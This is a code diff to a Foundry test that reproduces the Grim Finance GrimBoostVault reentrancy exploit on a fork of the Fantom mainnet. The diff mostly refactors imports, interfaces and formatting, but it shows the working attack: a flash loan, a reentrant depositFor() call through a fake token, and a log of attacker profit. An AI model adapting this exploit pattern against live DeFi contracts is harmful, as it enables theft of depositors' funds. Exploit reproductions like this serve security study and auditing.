@@ -1,11 +1,42 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.10;
+pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
+import {IERC20Metadata as IWFTM} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
+import {IERC20Metadata as IERC20} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
+import {IFlashLoanRecipient} from "src/interfaces/IFlashLoanRecipient.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IPancakePair} from "src/interfaces/IPancakePair.sol";
+
+interface IGrimBoostVault {
+    event NewStratCandidate(address implementation);
+    event UpgradeStrat(address implementation);
+
+    function want() external view returns (IERC20);
+    function balance() external view returns (uint256);
+    function available() external view returns (uint256);
+    function getPricePerFullShare() external view returns (uint256);
+    function depositAll() external;
+    function deposit(uint256 _amount) external;
+    function earn() external;
+    function withdrawAll() external;
+    function withdraw(uint256 _shares) external;
+    function proposeStrat(address _implementation) external;
+    function upgradeStrat() external;
+    function inCaseTokensGetStuck(address _token) external;
+    function depositFor(address token, uint256 _amount, address user) external;
+}
+
+interface IBeethovenVault {
+    function flashLoan(
+        IFlashLoanRecipient recipient,
+        IERC20[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
 contract ContractTest is Test {
-
     address btcAddress = 0x321162Cd933E2Be498Cd2267a90534A804051b11;
     address wftmAddress = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
     address routerAddress = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52;
@@ -18,14 +49,13 @@ contract ContractTest is Test {
     IPancakePair btc_wftm = IPancakePair(btc_wftm_address);
     IBeethovenVault beethovenVault = IBeethovenVault(beethovenVaultAddress);
     IGrimBoostVault grimBoostVault = IGrimBoostVault(grimBoostVaultAddress);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     uint256 btcLoanAmount = 30 * 1e8;
     uint256 wftmLoanAmount = 937_830 * 1e18;
     uint256 reentrancySteps = 7;
     uint256 lpBalance;
 
     function setUp() public {
-        cheats.createSelectFork("fantom", 25_345_002); //fork fantom at block 25345002
+        vm.createSelectFork("fantom", 25_345_002); //fork fantom at block 25345002
     }
 
     function testExploit() public {
@@ -36,7 +66,12 @@ contract ContractTest is Test {
         uint256[] memory loanAmounts = new uint256[](2);
         loanAmounts[0] = wftmLoanAmount;
         loanAmounts[1] = btcLoanAmount;
-        beethovenVault.flashLoan(IFlashLoanRecipient(address(this)), loanTokens, loanAmounts, "0x");
+        beethovenVault.flashLoan(
+            IFlashLoanRecipient(address(this)),
+            loanTokens,
+            loanAmounts,
+            "0x"
+        );
     }
 
     // Called after receiving Flash Loan Funds
@@ -50,7 +85,14 @@ contract ContractTest is Test {
         wftm.approve(routerAddress, wftmLoanAmount);
         btc.approve(routerAddress, btcLoanAmount);
         router.addLiquidity(
-            btcAddress, wftmAddress, btcLoanAmount, wftmLoanAmount, 0, 0, address(this), block.timestamp
+            btcAddress,
+            wftmAddress,
+            btcLoanAmount,
+            wftmLoanAmount,
+            0,
+            0,
+            address(this),
+            block.timestamp
         );
 
         // Call depositFor() in GrimBoostVault, reentrancy to this.transferFrom
@@ -74,9 +116,15 @@ contract ContractTest is Test {
             _token.transfer(beethovenVaultAddress, (_amount + _feeAmount));
         }
 
-        emit log_named_uint("WFTM attacker profit", wftm.balanceOf(address(this)) / 1e18);
+        emit log_named_uint(
+            "WFTM attacker profit",
+            wftm.balanceOf(address(this)) / 1e18
+        );
 
-        emit log_named_uint("BTC attacker profit", btc.balanceOf(address(this)) / 1e8);
+        emit log_named_uint(
+            "BTC attacker profit",
+            btc.balanceOf(address(this)) / 1e8
+        );
     }
 
     // Called by the reentrancy vulnerability in grimBoostVault.depositFor()
@@ -87,8 +135,11 @@ contract ContractTest is Test {
             grimBoostVault.depositFor(address(this), lpBalance, address(this));
         } else {
             //In the last step on reentrancy call depositFor() with token==SPIRIT-LP, user==ATTACKER
-            grimBoostVault.depositFor(btc_wftm_address, lpBalance, address(this));
+            grimBoostVault.depositFor(
+                btc_wftm_address,
+                lpBalance,
+                address(this)
+            );
         }
     }
-
 }
